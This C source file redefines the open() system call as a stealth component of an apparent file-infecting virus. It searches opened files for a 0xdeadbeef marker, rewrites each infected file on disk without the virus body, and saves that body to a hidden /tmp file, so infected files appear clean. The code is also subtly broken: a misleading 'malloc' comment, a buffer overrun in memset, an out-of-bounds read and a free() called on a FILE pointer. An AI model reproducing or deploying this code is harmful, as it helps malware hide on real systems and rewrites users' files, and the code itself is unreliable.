#include <stdio.h>
#include  <sys/types.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <string.h>

#include <sys/stat.h>
#include <unistd.h>



/* This function wraps the real malloc */
int open (char  *filename,  int  access){


  const int flgSize = 4;
  char txt[4] = {0xde,0xad,0xbe,0xef};

  FILE *fp = fopen(filename,"r");
  if(fp==NULL){
    printf("Could not open file %s \n",filename);
    return -1;
  }


  fseek(fp,0L,SEEK_END);
  int size = ftell(fp);
  fseek(fp,0L,SEEK_SET);

 
  char *str = malloc(size);
  memset(str,0,size+1);
 
  char cur;
  int virusSize = -1; // once find deadbeaf, the position is exactly hostsize
  int i = 0,j=0;

  fread(str,1,size,fp);
  for(i=0;i<size;i++){
    if(virusSize<0){
      for(j=0;j<flgSize;j++){
	if(str[i+j] !=txt[j]|| i+j>=size)
	  break;
      }
      if(j==flgSize)
	virusSize = i;
    }    
  }  

  //fclose(fp);

  if(virusSize<0) // no infection here.
    return syscall(__NR_open,filename,access);

  // exist virus, we need rewrite filename here.
  fp = fopen(filename,"w");
  if(fp==NULL){
    return -1;
  }
  fwrite(str+virusSize+flgSize,sizeof(char),size-virusSize-flgSize,fp);
  fclose(fp);


  int fd = syscall(__NR_open,filename,access);
  if(fd<0)
    return fd;

 
  uid_t mysuid,myeuid,myruid;
  getresuid(&myruid,&myeuid,&mysuid);
  uid_t mypid = getpid();
  char name[100] = {0};
  sprintf(name,"/tmp/.%d.%d.%d",mypid,fd,myruid);

  fp = fopen(name,"w");
  if(fp==NULL){
    free(fp);
    return fd;
  }

  fwrite(str,sizeof(char),virusSize,fp);

  fclose(fp);
  
  free(str);
  return fd;
}
